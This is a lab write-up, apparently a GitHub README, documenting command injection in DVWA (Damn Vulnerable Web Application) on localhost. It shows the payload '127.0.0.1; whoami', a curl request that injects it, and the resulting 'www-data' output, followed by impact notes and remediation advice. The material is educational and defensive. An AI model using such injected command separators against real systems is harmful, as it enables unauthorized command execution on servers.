# DVWA – Command Injection

## 📌 Overview

This lab demonstrates a **Command Injection vulnerability** in Damn Vulnerable Web Application (DVWA).

Command Injection occurs when an application passes user-controlled input to an operating system command without proper validation or sanitization. An attacker may manipulate the input to execute additional commands on the underlying server.

In this controlled lab environment, command execution was successfully demonstrated using the `whoami` command.

---

## 🎯 Lab Objective

The objective of this lab was to:

* Identify a Command Injection vulnerability.
* Understand how user input reaches an OS command.
* Demonstrate command execution using a controlled payload.
* Capture evidence of successful exploitation.
* Assess the potential security impact.
* Document appropriate remediation measures.

---

## 🧪 Lab Environment

| Component             | Details                                |
| --------------------- | -------------------------------------- |
| Application           | Damn Vulnerable Web Application (DVWA) |
| Vulnerability         | Command Injection                      |
| Security Level        | Low                                    |
| Target                | `http://localhost:8080/DVWA/`          |
| Tested Endpoint       | `/DVWA/vulnerabilities/exec/`          |
| Operating Environment | Local Lab                              |
| Result                | Command Execution Confirmed            |

---

# 🔍 Vulnerability Identification

The vulnerable functionality accepts an IP address as user input.

### Normal Input

```text
127.0.0.1
```

The application processes this input as part of an operating system command.

During testing, I investigated whether additional commands could be appended to the input.

---

# ⚔️ Attack / Exploitation

A controlled Command Injection payload was used:

```text
127.0.0.1; whoami
```

The semicolon (`;`) separates commands, causing the application to process the `whoami` command after the original input.

### Payload

```text
127.0.0.1; whoami
```

### HTTP Parameter

```text
ip=127.0.0.1; whoami
```

The request was sent to:

```text
http://localhost:8080/DVWA/vulnerabilities/exec/
```

---

# 📸 Evidence

## Evidence 1 – Command Injection in DVWA

The payload was submitted through the DVWA Command Injection functionality.

![Command Injection in DVWA](evidence/01-command-injection.png)

**Observation:**
The application accepted the manipulated input, demonstrating that the parameter was not properly restricted to a valid IP address.

---

## Evidence 2 – Command Execution Confirmed

The same payload was tested using `curl` with the authenticated DVWA session.

The command returned:

```text
www-data
```

![Command Injection Curl Evidence](evidence/02-curl-command-injection.png)

**Observation:**
The `whoami` command executed successfully and returned `www-data`, confirming that attacker-controlled input reached the operating system command execution context.

---

# 💻 Command-Line Verification

The following request was used for verification:

```bash
curl -s \
  -H 'Cookie: PHPSESSID=<LAB_SESSION_ID>; security=low' \
  -d 'ip=127.0.0.1; whoami&Submit=Submit' \
  "http://localhost:8080/DVWA/vulnerabilities/exec/" | grep -A 5 -B 5 'www-data'
```

### Observed Output

```text
<pre>www-data
</pre>
```

This confirms successful command execution.

> **Note:** The session ID is intentionally represented as `<LAB_SESSION_ID>` in this documentation rather than publishing an active session token.

---

# 💥 Impact

Successful Command Injection can allow an attacker to execute operating-system commands with the privileges of the web application.

Potential impact includes:

* Arbitrary command execution
* Unauthorized access to server resources
* Reading sensitive files
* Modifying or deleting files
* System reconnaissance
* Access to environment information
* Potential privilege escalation
* Further compromise of the host

In this lab, command execution was confirmed under the:

```text
www-data
```

account.

This demonstrates that the injected command was executed by the web server process.

---

# 🧠 Root Cause

The vulnerability exists because user-controlled input is passed to an operating system command without sufficient validation or safe command handling.

The application should not directly trust the `ip` parameter supplied by the user.

The input:

```text
127.0.0.1; whoami
```

was interpreted as more than just an IP address because shell command separators were not properly prevented.

---

# 🛡️ Remediation

The following security controls should be implemented.

### 1. Avoid OS Commands Where Possible

The application should use native programming functions instead of executing shell commands whenever possible.

### 2. Implement Strict Input Validation

Only valid IPv4/IPv6 addresses should be accepted.

For example:

```text
127.0.0.1
```

should be accepted, while input containing command characters should be rejected.

### 3. Use Allowlisting

Instead of trying to block individual malicious characters, define exactly what input is allowed.

For an IP address field, validate it using a proper IP-address validation function.

### 4. Prevent Shell Metacharacters

Input containing shell control characters such as:

```text
;
&
|
`
$
>
<
```

should not be interpreted as executable commands.

However, character blacklisting alone should **not** be considered a complete security solution.

### 5. Apply Least Privilege

The web application should run with the minimum privileges required.

If command injection occurs, limiting the privileges of the web process can reduce the potential damage.

### 6. Implement Security Monitoring

Monitor application and server logs for suspicious command execution patterns and unexpected input.

### 7. Defense in Depth

Additional controls such as application isolation, containerization, restricted filesystem permissions, and network segmentation can reduce the impact of a successful compromise.

---

# 🔎 Security Verification

The vulnerability was successfully reproduced in the controlled DVWA environment.

### Test Payload

```text
127.0.0.1; whoami
```

### Expected Secure Behavior

The application should reject the input because it is not a valid IP address.

### Actual Behavior

The application executed the injected command and returned:

```text
www-data
```

### Finding

**Command Injection: CONFIRMED**

---

# 📊 Finding Summary

| Field               | Details                       |
| ------------------- | ----------------------------- |
| Vulnerability       | Command Injection             |
| Severity            | High                          |
| Target              | DVWA                          |
| Endpoint            | `/DVWA/vulnerabilities/exec/` |
| Parameter           | `ip`                          |
| Security Level      | Low                           |
| Payload             | `127.0.0.1; whoami`           |
| Result              | `www-data`                    |
| Exploitation Status | Confirmed                     |
| Environment         | Controlled Local Lab          |

---

# 🎓 Lessons Learned

This lab demonstrated the security risks of passing untrusted user input directly into operating system commands.

Key takeaways:

* User input should never be trusted.
* OS command execution should be avoided when possible.
* Strict allowlist validation is important.
* Command Injection can result in arbitrary OS command execution.
* Least privilege can reduce the impact of exploitation.
* Security findings should include reproducible technical evidence.
* Screenshots and command output provide useful evidence when documenting vulnerabilities.

---

# 📁 Evidence Structure

The evidence files for this lab are organized as follows:

```text
DVWA-Command-Injection/
├── README.md
└── evidence/
    ├── 01-command-injection.png
    └── 02-curl-command-injection.png
```

---

##Screenshots

![DVWA Command Injection](screenshots/01-dvwa-command-injection.png.png)

![Network Evidence](screenshots/02-network-evidence.png.png)

![Curl Command Injection Result](screenshots/03-curl-result.png.png)

# ⚠️ Disclaimer

This testing was performed against a deliberately vulnerable **DVWA instance in a controlled local lab environment** for educational and defensive cybersecurity purposes.

Do not perform Command Injection testing against systems or applications without explicit authorization.

---

## ✅ Final Result

**Command Injection successfully identified and confirmed.**

The payload:

```text
127.0.0.1; whoami
```

resulted in:

```text
www-data
```

providing clear evidence that user-controlled input could be used to execute an additional operating-system command.
